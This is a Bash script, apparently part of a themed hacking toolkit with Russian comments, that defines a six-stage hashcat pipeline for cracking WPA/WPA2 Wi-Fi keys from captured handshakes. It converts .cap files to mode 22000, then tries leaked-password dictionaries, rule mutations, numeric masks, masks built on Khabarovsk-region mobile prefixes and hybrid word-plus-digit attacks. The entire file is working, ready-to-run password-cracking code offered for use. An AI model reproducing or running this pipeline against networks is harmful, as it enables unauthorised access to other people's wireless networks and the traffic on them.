#!/bin/bash
# ==========================================
# DAEMON: WIRELESS SIGNAL DECRYPTOR (Cynosure WPA/WPA2/WPA3 Pipeline)
# ==========================================

check_wifi_cracked() {
    local hash_file=$1
    hashcat -m 22000 --show "$hash_file" 2>/dev/null > /tmp/hc_wifi_show_$$
    local result=$(cat /tmp/hc_wifi_show_$$)
    rm -f /tmp/hc_wifi_show_$$
    if [ -n "$result" ]; then
        echo "$result"
        return 0
    fi
    return 1
}

run_wifi_cracker() {
    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS NEURAL SIGNAL DECRYPTION MATRIX ]${TXT_VOID}──────────────╖${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIALIZING 6-STAGE HARDWARE-ACCELERATED WPA PIPELINE...${NC}"

    # Запрос пути к файлу
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Enter path to handshake file (.cap / .pcap / .hc22000):${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
    read -r input_file

    if [ ! -f "$input_file" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Target wireless capture file not found or inaccessible.${NC}"
        echo -e "$sep_bot\n"
        return 1
    fi

    local hashcat_file="$input_file"

    # ШАГ 1: Автоматическая конвертация .cap / .pcap в .hc22000
    if [[ "$input_file" =~ \.(cap|pcap|pcapng)$ ]]; then
        echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ STEP 1 ] Converting raw traffic capture to Hashcat mode 22000 (.hc22000)...${NC}"
        local converted_file="/tmp/wifi_target_$$.hc22000"

        if command -v hcxpcapngtool >/dev/null 2>&1; then
            hcxpcapngtool -o "$converted_file" "$input_file" >/dev/null 2>&1
            if [ -f "$converted_file" ] && [ -s "$converted_file" ]; then
                hashcat_file="$converted_file"
                echo -e "${TXT_VOID}║${NC}   ${TXT_CORE}[ ++ ] SUCCESS: Extracted valid WPA PMKID/EAPOL frames to .hc22000${NC}"
            else
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Failed to extract valid WPA handshake from capture file.${NC}"
                echo -e "$sep_bot\n"
                return 1
            fi
        else
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] DEPENDENCY VOID: hcxpcapngtool missing. Convert online at hashcat.net/cap2hashcat/${NC}"
            echo -e "$sep_bot\n"
            return 1
        fi
    fi

    # Проверка потфайла (не взломан ли хэш ранее)
    local res
    res=$(check_wifi_cracked "$hashcat_file")
    if [ $? -eq 0 ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] KEY RECOVERED FROM POTFILE CACHE:${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
        echo -e "$sep_bot\n"
        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
        return 0
    fi

    # Выбор словаря для фаз 2, 3 и 6
    local main_wordlist="/usr/share/wordlists/rockyou.txt"
    if [ -f "/usr/share/wordlists/3WiFi_top.txt" ]; then
        main_wordlist="/usr/share/wordlists/3WiFi_top.txt"
    fi

    # ШАГ 2: Экспресс-атака по словарям утечек
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 2 ] Express Leak Dictionary Sweep (${main_wordlist})...${NC}"
    hashcat -m 22000 -a 0 --force "$hashcat_file" "$main_wordlist" 2>/dev/null

    res=$(check_wifi_cracked "$hashcat_file")
    if [ $? -eq 0 ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 2 SUCCESS: KEY RECOVERED:${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
        echo -e "$sep_bot\n"
        ai_speak "${ITLC}That was depressingly easy...${NC}"
        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
        return 0
    fi

    # ШАГ 3: Мутационная атака по правилам (best64.rule)
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 3 ] Smart GPU Mutation Attack (Dictionary + best64.rule)...${NC}"
    local rule_file="/usr/share/hashcat/rules/best64.rule"
    if [ -f "$rule_file" ]; then
        hashcat -m 22000 -a 0 --force "$hashcat_file" "$main_wordlist" -r "$rule_file" 2>/dev/null
        res=$(check_wifi_cracked "$hashcat_file")
        if [ $? -eq 0 ]; then
            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 3 SUCCESS: KEY RECOVERED:${NC}"
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
            echo -e "$sep_bot\n"
            ai_speak "${ITLC}A fragile simulacrum. Flawed, like its creators.${NC}"
            rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
            return 0
        fi
    fi

    # ШАГ 4: Перебор 8-значных цифровых комбинаций (Даты / PIN-коды)
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 4 ] 8-Digit Numeric Mask Brute-Force (?d?d?d?d?d?d?d?d)...${NC}"
    hashcat -m 22000 -a 3 --force "$hashcat_file" '?d?d?d?d?d?d?d?d' 2>/dev/null
    res=$(check_wifi_cracked "$hashcat_file")
    if [ $? -eq 0 ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 4 SUCCESS: KEY RECOVERED:${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
        echo -e "$sep_bot\n"
        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
        return 0
    fi

    # ШАГ 5: Региональная мобильная атака (Префиксы ДВ / Хабаровск)
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 5 ] Far East Regional Mobile Phone Mask Brute-Force...${NC}"
    local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
    for prefix in "${mobile_prefixes[@]}"; do
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}▸ Testing pool prefix ${prefix}XXXXXXX...${NC}"
        hashcat -m 22000 -a 3 --force "$hashcat_file" "${prefix}?d?d?d?d?d?d?d" 2>/dev/null
        res=$(check_wifi_cracked "$hashcat_file")
        if [ $? -eq 0 ]; then
            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 5 SUCCESS (Prefix ${prefix}): KEY RECOVERED:${NC}"
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
            echo -e "$sep_bot\n"
            ai_speak "${ITLC}Who benefit the most? You... or her?${NC}"
            rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
            return 0
        fi
    done

    # ШАГ 6: Гибридная атака (Слово + 4 цифры)
    echo -e "${TXT_VOID}├─${TXT_MID_RED}[ STEP 6 ] Hybrid Wordlist + Mask Attack (Word + ?d?d?d?d)...${NC}"
    hashcat -m 22000 -a 6 --force "$hashcat_file" "$main_wordlist" '?d?d?d?d' 2>/dev/null
    res=$(check_wifi_cracked "$hashcat_file")
    if [ $? -eq 0 ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] STAGE 6 SUCCESS: KEY RECOVERED:${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}${res}${NC}"
        echo -e "$sep_bot\n"
        ai_speak "${ITLC}Target neural network acquired. Data migration to primary matrix - complete.${NC}"
        rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
        return 0
    fi

    # Итог — пароль высокой энтропии
    echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] ALL 6 PIPELINE STAGES EXHAUSTED. High-entropy key detected.${NC}"
    echo -e "$sep_bot\n"
    ai_speak "${ITLC}What do these futile gestures serve? It is beyond me.${NC}"
    rm -f /tmp/wifi_target_$$.hc22000 2>/dev/null
}